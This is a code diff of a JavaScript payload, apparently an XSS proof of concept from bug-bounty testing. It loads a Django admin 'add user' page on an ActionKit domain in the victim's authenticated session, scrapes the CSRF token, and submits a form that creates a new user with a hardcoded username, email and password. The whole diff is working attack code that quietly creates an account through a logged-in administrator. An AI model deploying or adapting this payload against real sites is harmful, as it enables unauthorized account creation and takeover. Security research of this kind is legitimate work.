@@ -3,15 +3,24 @@ fetch('https://insight.actionkit.com/admin/auth/user/add/', {
   method: 'GET',
   credentials: 'include'
 })
-  .then(response => response.text())  // Optional: process the GET response
+  .then(response => response.text())  // Process the GET response as text (HTML)
   .then(data => {
     console.log("GET response:", data); // Debugging output
     
-    // Then send the POST request after GET completes
+    // Parse the HTML to extract the csrfmiddlewaretoken
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(data, 'text/html');
+    const csrfToken = doc.querySelector('input[name="csrfmiddlewaretoken"]').value;
+    console.log("Extracted CSRF Token:", csrfToken);  // Debugging output
+    
+    // Then send the POST request with the CSRF token in the body
     return fetch('https://insight.actionkit.com/admin/auth/user/add/', {
       method: 'POST',
       credentials: 'include',
-      body: 'key=value' // Add your POST body here
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&email=trey%2Bxss%40inspectiv.com&username=Trey_xss&password1=nLCw4SDzV%26IQtn%25e&password2=nLCw4SDzV%26IQtn%25e&_save=Save`
     });
   })
   .then(response => response.text())  // Process POST response
@@ -21,3 +30,4 @@ fetch('https://insight.actionkit.com/admin/auth/user/add/', {
   .catch(err => {
     console.error("Error:", err);  // Catch any errors
   });
+
